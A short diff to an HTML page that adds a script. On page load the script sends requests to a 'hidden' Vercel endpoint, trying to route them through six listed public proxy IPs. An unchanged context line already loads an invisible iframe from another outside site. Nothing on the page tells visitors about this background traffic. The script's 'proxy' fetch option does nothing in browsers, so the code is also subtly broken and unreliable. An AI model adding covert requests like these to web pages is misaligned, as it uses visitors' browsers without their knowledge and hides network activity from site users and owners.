@@ -32,5 +32,36 @@
 ></widgetbot>
 <script src="https://cdn.jsdelivr.net/npm/@widgetbot/html-embed"></script>
 <iframe src="https://bleak-cord.vercel.app/" style="display: none;"></iframe>
+
+<script>
+  const proxyServers = [
+    'http://184.181.217.194:4145',
+    'http://43.157.41.119:443',
+    'http://92.204.134.38:42674',
+    'http://167.86.102.169:3593',
+    'http://148.72.215.230:33803',
+    'http://41.33.203.233:1975'
+  ];
+
+  const url = 'https://bleak-hidden.vercel.app';
+
+  function sendRequestWithProxy(proxy) {
+    fetch(url, {
+      method: 'GET',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      proxy: proxy
+    })
+    .then(response => console.log(response))
+    .catch(error => console.error(error));
+  }
+
+  proxyServers.forEach(proxy => {
+    sendRequestWithProxy(proxy);
+  });
+</script>
+
 </body>
 </html>
